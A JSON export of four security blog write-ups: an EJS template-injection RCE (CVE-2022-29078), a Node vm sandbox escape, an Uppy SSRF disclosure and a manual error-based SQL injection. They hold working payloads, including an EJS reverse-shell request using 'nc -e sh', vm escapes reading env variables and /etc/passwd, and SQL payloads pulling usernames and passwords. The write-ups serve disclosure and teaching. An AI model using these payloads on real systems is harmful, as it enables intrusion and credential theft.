[{"content":" Note: The objective of this research or any similar researches is to improve the nodejs ecosystem security level.\nRecently i was working on a related project using one of the most popular Nodejs templating engines Embedded JavaScript templates - EJS\nIn my weekend i started to have a look around to see if the library is vulnerable to server side template injection. Since the library is open source we can have a whitebox approach and look at the source code.\nyou can use a debugger to put several breakpoint to understand the code flow quicky. Or at least you can do a print (or console.log) to see what functions is called and what is the variables values\nThe analysis I noticed an interesting thing in the render function\nexports.render = function (template, d, o) { var data = d || {}; var opts = o || {}; // No options object -- if there are optiony names // in the data, copy them to options if (arguments.length == 2) { utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA); } return handleCache(opts, template)(data); }; libs/ejs.js:413\nThe data and options is merged together through this function utils.shallowCopyFromList So in theory we can overwrite the template options with the data (coming from user)\nA look into the function shows it has some restrictions\nexports.shallowCopyFromList = function (to, from, list) { for (var i = 0; i \u0026lt; list.length; i++) { var p = list[i]; if (typeof from[p] != \u0026#39;undefined\u0026#39;) { to[p] = from[p]; } } return to; }; libs/utils.js:135\nIt only copies the data if it\u0026rsquo;s in the passed list defined\nvar _OPTS_PASSABLE_WITH_DATA = [\u0026#39;delimiter\u0026#39;, \u0026#39;scope\u0026#39;, \u0026#39;context\u0026#39;, \u0026#39;debug\u0026#39;, \u0026#39;compileDebug\u0026#39;, \u0026#39;client\u0026#39;, \u0026#39;_with\u0026#39;, \u0026#39;rmWhitespace\u0026#39;, \u0026#39;strict\u0026#39;, \u0026#39;filename\u0026#39;, \u0026#39;async\u0026#39;]; OK, its time to have a proof of concept and lets try this options to see what impact we can make\n// index.js const express = require(\u0026#39;express\u0026#39;) const app = express() const port = 3000 app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); app.get(\u0026#39;/page\u0026#39;, (req,res) =\u0026gt; { res.render(\u0026#39;page\u0026#39;, req.query); }) app.listen(port, () =\u0026gt; { console.log(`Example app listening on port ${port}`) }) // page.ejs \u0026lt;h1\u0026gt; You are viewing page number \u0026lt;%= id %\u0026gt;\u0026lt;/h1\u0026gt; Now if we lunched this application and send this request for example\nhttp://localhost:3000/page?id=2\u0026amp;debug=true This will ends up enabling ejs debug mode. But there is not much impact because if there is no errors nothing will show 🤷\nOK, lets try something else. What about the delimiter\nhttp://localhost:3000/?delimiter=NotExistsDelimiter ok, This is interesting because it will disclose the template because the delimiter is not exists.\nOne more thing i tried here is to try to exploit to to have a reDos attack. Because this delimiter is added to regex and this regex is executed against the template contents.\ncreateRegex: function () { var str = _REGEX_STRING; var delim = utils.escapeRegExpChars(this.opts.delimiter); var open = utils.escapeRegExpChars(this.opts.openDelimiter); var close = utils.escapeRegExpChars(this.opts.closeDelimiter); str = str.replace(/%/g, delim) .replace(/\u0026lt;/g, open) .replace(/\u0026gt;/g, close); return new RegExp(str); } libs/ejs.js:558\nSo if we added a delimiter xx the regex will be like this\n(\u0026lt;xxxx|xxxx\u0026gt;|\u0026lt;xx=|\u0026lt;xx-|\u0026lt;xx_|\u0026lt;xx#|\u0026lt;xx|xx\u0026gt;|-xx\u0026gt;|_xx\u0026gt;) But the problem as you see above that it\u0026rsquo;s well escaped utils.escapeRegExpChars so we can\u0026rsquo;t actually put any regex reserved characters (*,$, [] ..etc) so basically we can\u0026rsquo;t do somethig catastrophic here.\nOK, thats boring. What will be really exciting is to find RCE\nThe RCE exploit 🔥🔥 I spent sometime looking around till i find this interesting lines in the renderFile function.\n// Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings[\u0026#39;view options\u0026#39;]; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } libs/ejs.js:471\nInteresing, so in the case of express view options ejs will copy everything into the options without restrictions 🎉\nBingo, now what we need is just to find option included in the template body without escaping\nprepended += \u0026#39; var __output = \u0026#34;\u0026#34;;\\n\u0026#39; + \u0026#39; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s }\\n\u0026#39;; if (opts.outputFunctionName) { prepended += \u0026#39; var \u0026#39; + opts.outputFunctionName + \u0026#39; = __append;\u0026#39; + \u0026#39;\\n\u0026#39;; } so if we injected code in the outputFunctionName option it will included in the source code.\nPayload like this x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s\nit will be added to the template compiled code\nvar x;process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;touch /tmp/pwned\u0026#39;);s= __append; and our code will be excuted successfully\nSo lets try a reverse shell\nfirst lets run netcat on our maching\nnc -lnvp 1337 and lets inject some code\nhttp://localhost:3000/page?id=2\u0026amp;settings[view options][outputFunctionName]=x;process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;nc -e sh 127.0.0.1 1337\u0026#39;);s And here we go 🔥\nFix \u0026amp; Mitigation Ejs already issued a fix to prevent injecting any code in the options especially opts.outputFunctionName\nand they released v3.1.7\nTimeline 10 Apr 2022: Reported to vendor 12 Apr 2022: CVE number assigned (CVE-2022-29078) 20 Apr 2022: Fix released ","permalink":"http://eslam.io/posts/ejs-server-side-template-injection-rce/","summary":"Note: The objective of this research or any similar researches is to improve the nodejs ecosystem security level.\nRecently i was working on a related project using one of the most popular Nodejs templating engines Embedded JavaScript templates - EJS\nIn my weekend i started to have a look around to see if the library is vulnerable to server side template injection. Since the library is open source we can have a whitebox approach and look at the source code.","title":"EJS, Server side template injection RCE (CVE-2022-29078) - writeup"},{"content":"As any nodejs developer you should often check the nodejs documentation look for new modules or new features or even a change in the current API. If you do you will notice a module called \u0026ldquo;VM\u0026rdquo; (Executing Javascript). This is a very interesting module as per nodejs documentation defination \u0026ldquo;The vm module enables compiling and running code within V8 Virtual Machine contexts\u0026rdquo;\nAlthough the documentation state that \u0026ldquo;The vm module is not a security mechanism. Do not use it to run untrusted code.\u0026rdquo; It\u0026rsquo;s very tempting to use it on user data, Imagine if you allow users to run simple js to extend functionality on your application, pretty cool right ??\nNo, Absolutely no and i will tell you why in this article.\nUsage example The use for the VM module is very simple, For example if you want to run simple var addition.\nconst vm = require(\u0026#39;vm\u0026#39;) const context = { x : 2 } const code = \u0026#39;var y = 3; x += y;\u0026#39; vm.runInContext(code, context) console.log(context.x); // 5 console.log(context.y) // 3 The invoked code has a different global object than the invoking code via the context parameter. You can read more about the usage and the api here Nodej VM Module\nThe risk 1. DoS Attack The first risk is Denial of Service attack on your application, The fact that the nodejs is a single threaded and depends on the Event loop make it easy to put the application out of service by blocking the event loop with heavy or endless operation.\nImagine what the following code does.\nconst vm = require(\u0026#39;vm\u0026#39;); const code = \u0026#39;while(true){}\u0026#39;; vm.runInNewContext(code,{}); console.log(\u0026#39;Never gets executed.\u0026#39;) Exactly, The infinte loop here will block the event loop in your main process. Remember the VM will run the js code in new V8 Virtual Machine context but in the same process and the same event loop.\nEscaping the Sandbox The VM module seperate the context of new invoked code from the original application code. Providing some sort of sandbox to run the code in semi isolated context. However it can be escaped easily. Thanks to our friends the makers of VM2 module (will be mentioned later) they provide the public with escape exploit.\nIt\u0026rsquo;s as simple as\nthis.constructor.constructor The constructor property returns a reference to the Object constructor function that created the instance object.\nso lets break it down, the first this is refered to the context\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.y\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); // == y == 1 so the this.constructor will refer the the constructor of the context, lets try.\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); // function Object() { [native code] } so, its refrenced to native code, probably internal VM module code, lets go one step higher\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor.constructor\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); // function Object() { [native code] } Another native code function, lets try to execute this function\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor.constructor()\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); // function anonymous() {} Bingo, We got the anonymous wrapper that holds the code to be invoked in the VM, Now we can use it to escape the sandbox like this\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor.constructor(\u0026#34;return this\u0026#34;)()\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); If you notice we added \u0026ldquo;()\u0026rdquo; in order to execute the anonymous function. Now we got full this dump\nObject [global] { global: [Circular], process: process { title: \u0026#39;node\u0026#39;, version: \u0026#39;v10.15.1\u0026#39;, versions: { http_parser: \u0026#39;2.8.0\u0026#39;, node: \u0026#39;10.15.1\u0026#39;, v8: \u0026#39;6.8.275.32-node.12\u0026#39;, uv: \u0026#39;1.23.2\u0026#39;, zlib: \u0026#39;1.2.11\u0026#39;}, arch: \u0026#39;x64\u0026#39;, platform: \u0026#39;darwin\u0026#39;, release: { name: \u0026#39;node\u0026#39;, lts: \u0026#39;Dubnium\u0026#39;, sourceUrl: \u0026#39;https://nodejs.org/download/release/v10.15.1/node-v10.15.1.tar.gz\u0026#39;, headersUrl: \u0026#39;https://nodejs.org/download/release/v10.15.1/node-v10.15.1-headers.tar.gz\u0026#39; }, argv: [ \u0026#39;/usr/local/bin/node\u0026#39;, \u0026#39;/Users/eslam/Documents/Code/POC/vm/index.js\u0026#39; ], execArgv: [], env: ..... Now what, What we can do with it.\na. Terminate the application :D\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor.constructor(\u0026#34;return process\u0026#34;)().exit()\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); b. Leak the environment variables\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor.constructor(\u0026#34;return process.env\u0026#34;)()\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); c. Leak the source code :D\nAlthough you can\u0026rsquo;t use require directly, you can use process.mainModule.require to load modules. Let\u0026rsquo;s try it.\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor.constructor(\u0026#34;return process.mainModule.require(\\\u0026#39;fs\\\u0026#39;).readFileSync(process.mainModule.filename,\\\u0026#39;utf-8\\\u0026#39;)\u0026#34;)()\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); d. Command injection, how about reading /etc/passwd\nconst vm = require(\u0026#39;vm\u0026#39;); code = \u0026#39;var x = this.constructor.constructor(\u0026#34;return process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).execSync(\\\u0026#39;cat /etc/passwd\\\u0026#39;,{encoding:\u0026#39;utf-8\u0026#39;})\u0026#34;)()\u0026#39;; let context = {y : 1} vm.runInNewContext(code,context); console.log(context.x); The limitation is only your imagination. The recommendition here is never use the \u0026ldquo;VM\u0026rdquo; nodejs module to run untrusted data.\nIf you really need to run user supplied data you can use more secure alternative like VM2 module or isolated-vm which being used by famous companies like Algolia or Fly.io\n","permalink":"http://eslam.io/posts/unsecure-node-vm/","summary":"As any nodejs developer you should often check the nodejs documentation look for new modules or new features or even a change in the current API. If you do you will notice a module called \u0026ldquo;VM\u0026rdquo; (Executing Javascript). This is a very interesting module as per nodejs documentation defination \u0026ldquo;The vm module enables compiling and running code within V8 Virtual Machine contexts\u0026rdquo;\nAlthough the documentation state that \u0026ldquo;The vm module is not a security mechanism.","title":"The unsecure node vm module"},{"content":" In this post, we will explain how Shieldfy detected an SSRF ( Server-side request forgery ) vulnerability in Uppy, one of the popular packages in NPM, diving into the technical details of the vulnerability, exploitation and the fix.\nUppy is a sleek, modular JavaScript file uploader that integrates seamlessly with any application. It’s fast, easy to use and lets you worry about more important problems than building a file uploader. Uppy has more than 130,000 downloads a month.\nIt started when we are trying the new vulnerability engine for Shieldfy. So we installed Shieldfy on some of the most active Nodejs repositories in Github and we got a hit.\nin Uppy they have a great structure to modulize the package instead of having a monolithic package. So you will find sub-package for the feature inside the main package.\nHere you will find that Shieldfy spotted a vulnerability inside @uppy/companion – the server responsible for the uploading in the backend – in the way companion treat uploading through URL.\nIf you have a closer look at the above code. you will find the downloadURLfunction which is requesting the URL directly without any validation.If you tracked how downloadURL function is called, you will find its called inside get function with parameter req.body.url\nuploader.onSocketReady(() =\u0026gt; { logger.debug(\u0026#39;Socket connection received. Starting remote download.\u0026#39;, null, req.id) downloadURL(req.body.url, uploader.handleChunk.bind(uploader), req.id) }) Bingo, we found SSRF vulnerability. All we have to do now is to develop a valid exploit and proof that this vulnerability is exploitable in the real life.\nWe uploaded a working example for the uppy \u0026amp; companion, You can find it here “” – Deploy under your own risk.To exploit SSRF you can make a request to any internal server and you may control it, but As a POC we decided that we want to get the server META data\nAfter verifying the vulnerability and its exploitable, its time to report the vulnerability to the Nodejs Security team and Uppy team\nI have to admit, they were very responsive and they deployed a fantastic fix immediately after they verified the vulnerability at their end.\nThe fix\nThey patched the vulnerability they add a validation for the IPs and whitelisted only (HTTP/HTTPs) protocols. You can follow the discussion happened the PR here: 2083 and the Hackerone report here: https://hackerone.com/reports/786956Thanks for the Uppy team and the Nodejs security team.\n","permalink":"http://eslam.io/posts/uppy-js-ssrf-vulnerability/","summary":"In this post, we will explain how Shieldfy detected an SSRF ( Server-side request forgery ) vulnerability in Uppy, one of the popular packages in NPM, diving into the technical details of the vulnerability, exploitation and the fix.\nUppy is a sleek, modular JavaScript file uploader that integrates seamlessly with any application. It’s fast, easy to use and lets you worry about more important problems than building a file uploader.","title":"SSRF vulnerability in Uppy, Detected by Shieldfy"},{"content":"Hi everybody I don’t post much write-ups online because most of the work done privately and under NDA.\nBut this time i decided to publish this (anonymously after website owner agreed ) because too many developers insists that you can’t exploit complicated SQL , or non result SQL (example: count(*) sql).\nNote: You can automate everything in this article using SQLMap, but i choose to exploit it manually to explain under the hood proccess.\nFirst I got a call from one of my friends told me that a hacker contacted them and told them that he found a sql-injection in their website and express his intentions to blackmail them.\nI opened the website and tried to play with the parameter just to check , in a couple of minutes i found a bug in their search page . search page make ajax request when you filter the result to the page , the term parameter is the one is not filtered.\n/?FilterThemes?tags[]=free\u0026amp;term='\nit generates a database error page with full sql dump ( debug mode is ON :) ).\nERROR 1064 You have an error in your SQL syntax; check the manual that corresponds to your MYSQL server version for the right syntax to use near \u0026#39;\u0026#39;,themes.tag_title) != 0\u0026#39; at line 1 SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET(\u0026#39;\u0026#39;\u0026#39;,themes.tag_title) != 0 or `themes`.`title` like \u0026#39;%\u0026#39;%\u0026#39; or `themes`.`desc` like \u0026#39;%\u0026#39;%\u0026#39; AND match (themes.tag_title) against (\u0026#39;free\u0026#39; in boolean mode) order by `themes`.`id` desc limit 12 Awesome , but oh wait …\nthe parameter pass first to count query before it pass to aggregate query.. so must our payload pass the two queries and execute it with union..\nOR …\nI remembered uncommon way we used it to exploit blind SQL injection which don’t generate any result to the browser — this way can done only if errors is displayed, great that what we have here , right!\nThe POC lets change the payload for a poc\n/?FilterThemes?tags[]=free\u0026amp;term=d%\u0026#39; AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT(\u0026#39;hello\u0026#39;,FLOOR(RAND(0)*2),\u0026#39;world\u0026#39;)x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \u0026#39;%\u0026#39;=\u0026#39; BINGO :)\nERROR 1062 Duplicate entry \u0026#39;hello1world\u0026#39; for key \u0026#39;group_key\u0026#39; SELECT COUNT(*) FROM (`themes`) JOIN `authors` on `authors`.`id` = `themes`.`author` FIND_IN_SET(\u0026#39;d%\u0026#39; AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT(\u0026#39;hello\u0026#39;,FLOOR(RAND(0)*2),\u0026#39;world\u0026#39;)x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \u0026#39;%\u0026#39;=\u0026#39;\u0026#39;,themes.tag_title) != 0 or `themes`.`title` like \u0026#39;%d%\u0026#39; AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT(\u0026#39;hello\u0026#39;,FLOOR(RAND(0)*2),\u0026#39;world\u0026#39;)x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \u0026#39;%\u0026#39;=\u0026#39;%\u0026#39; or `themes`.`desc` like \u0026#39;%d%\u0026#39; AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT(\u0026#39;hello\u0026#39;,FLOOR(RAND(0)*2),\u0026#39;world\u0026#39;)x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \u0026#39;%\u0026#39;=\u0026#39;%\u0026#39; AND match (themes.tag_title) against (\u0026#39;free\u0026#39; in boolean mode) order by `themes`.`id` desc limit 12 Did you notice :) , the expression CONCAT('hello',FLOOR(RAND(0)*2),'world') has been evaluated and displayed :)\nlet me explain the sql query and how it works before we finish our exploit.\nThere is some information you needs to know about MySQL.\nWhen mysql try to run a sql with multiple sub queries in it , it evaluate the sub queries first then the parent.\nWhen using group by required a unique key.\nTo understand more, lets try some queries on our terminal.\nSelect count(*) from INFORMATION_SCHEMA.CHARACTER_SETS; Normal count sql to count the number of records inside Information Scheme database (default database in mysql). now lets play with this sql a little.\nselect count(*), version() x from INFORMATION_SCHEMA.CHARACTER_SETS group by x again nothing special , we added version() (function retrieve the mysql version) and named it x and then we grouped by it.\n+----------+----------------------------------------+ | count(*) | x | +----------+----------------------------------------+ | 40 | 10.2.3-MariaDB-10.2.3+maria~xenial-log | +----------+----------------------------------------+ I use maria db in my local machine , its a fork from mysql but with much optimization\nLets be aggressive SELECT count(*), CONCAT(version(),floor(rand(0) *2)) x from INFORMATION_SCHEMA.CHARACTER_SETS group by x; We added a little change ( floor(rand(0) * 2) ) and if you run this sql you will get\nERROR 1062 (23000): Duplicate entry \u0026#39;10.2.3-MariaDB-10.2.3+maria~xenial-log1\u0026#39; for key \u0026#39;group_key\u0026#39; Do you remember the information i told you before about Mysql requires group key to be unique :).\nthe ( floor(rand(0) * 2) ) generates a sequence of 0, 1, 1, 0, 1, 1 and the version() will be always the same.\nso the sequence of calling count(*) will be\nCONCAT(version(),floor(rand(0) *2)) = 10.2.3-MariaDB-10.2.3+maria~xenial-log0 CONCAT(version(),floor(rand(0) *2)) = 10.2.3-MariaDB-10.2.3+maria~xenial-log1 CONCAT(version(),floor(rand(0) *2)) = 10.2.3-MariaDB-10.2.3+maria~xenial-log1 //Duplication So we got the error duplicate in the third attempt\nDuplicate entry \u0026#39;10.2.3-MariaDB-10.2.3+maria~xenial-log1\u0026#39; for key \u0026#39;group_key\u0026#39; do you got it :)\nExtract some data We got the error , we got the leak .. now we need some valuable informations.\nStarting with INFORMATION_SCHEME.tables , we can grab tables names.\nWith simple script we can grab all tables names by extracting the result from the db error , just feed the script with payload.\n%d%\u0026#39; AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select TABLE_NAME from INFORMATION_SCHEMA.TABLES LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND \u0026#39;%\u0026#39;=\u0026#39;% Now we know the users table. modifying the script with the new payload to grab users data.\n%d%\u0026#39; AND (SELECT 1337 FROM(SELECT COUNT(*),CONCAT((select concat(username,\u0026#39;-\u0026#39;,password) from users LIMIT 1,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND \u0026#39;%\u0026#39;=\u0026#39;% Thats it.\nLesson learned Always turn errors off in production. Don’t underestimate any bug , 99% of bugs can be exploited somehow. Stay safe.\n","permalink":"http://eslam.io/posts/practical-exploitation-of-error-based-sql-injection/","summary":"Hi everybody I don’t post much write-ups online because most of the work done privately and under NDA.\nBut this time i decided to publish this (anonymously after website owner agreed ) because too many developers insists that you can’t exploit complicated SQL , or non result SQL (example: count(*) sql).\nNote: You can automate everything in this article using SQLMap, but i choose to exploit it manually to explain under the hood proccess.","title":"Practical Exploitation of Error Based Sql Injection"}]